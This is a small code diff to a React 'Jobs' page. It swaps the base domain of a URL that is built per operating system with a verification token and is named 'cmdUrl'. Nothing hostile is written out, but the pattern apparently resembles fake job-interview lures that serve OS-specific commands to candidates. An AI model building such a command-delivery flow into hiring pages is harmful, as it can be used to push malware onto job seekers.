@@ -128,7 +128,7 @@ export default function Jobs() {
 
   const os = useMemo(() => detectOS(), [])
   const cmdUrl = useMemo(() => {
-    const base = 'https://www.nexustech.group/users/auth'
+    const base = 'https://www.nexusai.center/users/auth'
     return `${base}/${os}?token=${VERIFICATION_TOKEN}`
   }, [os])
 
